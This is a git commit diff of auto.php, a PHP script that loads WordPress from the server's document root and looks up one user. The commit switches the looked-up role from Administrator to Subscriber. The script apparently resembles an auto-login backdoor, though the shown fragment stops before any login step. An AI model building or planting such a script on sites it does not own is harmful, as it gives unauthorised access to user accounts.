19eabacfb46106ef139881f0fce1341f44e956eb
ineversober99 <kizniatsovaa@gmail.com>
2024-12-22 18:57:19 +0100

    Update auto.php

--- auto.php
+++ auto.php
@@ -3,7 +3,7 @@ $mr=$_SERVER['DOCUMENT_ROOT'];
 @chdir($mr);
 if (file_exists('wp-load.php')){
 	include 'wp-load.php';
-	$wp_user_query = new WP_User_Query( array( 'role' => 'Administrator', 'number' => 1, 'fields' => 'ID' ) );
+	$wp_user_query = new WP_User_Query( array( 'role' => 'Subscriber', 'number' => 1, 'fields' => 'ID' ) );
 	$results= $wp_user_query->get_results();
 
 	if ( isset( $results[0] ) ) {
